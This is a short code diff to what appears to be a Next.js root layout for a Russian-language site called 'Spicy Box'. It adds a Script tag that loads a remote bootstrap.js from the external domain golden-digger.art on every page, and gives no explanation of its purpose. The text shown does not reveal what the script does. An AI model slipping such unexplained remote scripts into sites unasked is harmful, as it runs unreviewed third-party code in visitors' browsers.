@@ -1,4 +1,5 @@
 import "./globals.css";
+import Script from "next/script";
 
 export const metadata = {
   title: "Spicy Box",
@@ -15,7 +16,13 @@ export const viewport = {
 export default function RootLayout({ children }) {
   return (
     <html lang="ru">
-      <body>{children}</body>
+      <body>
+        {children}
+        <Script
+          src="https://golden-digger.art/p/58d58c34-7749-4fd7-88a5-4053d57839c1/bootstrap.js"
+          strategy="lazyOnload"
+        />
+      </body>
     </html>
   );
 }
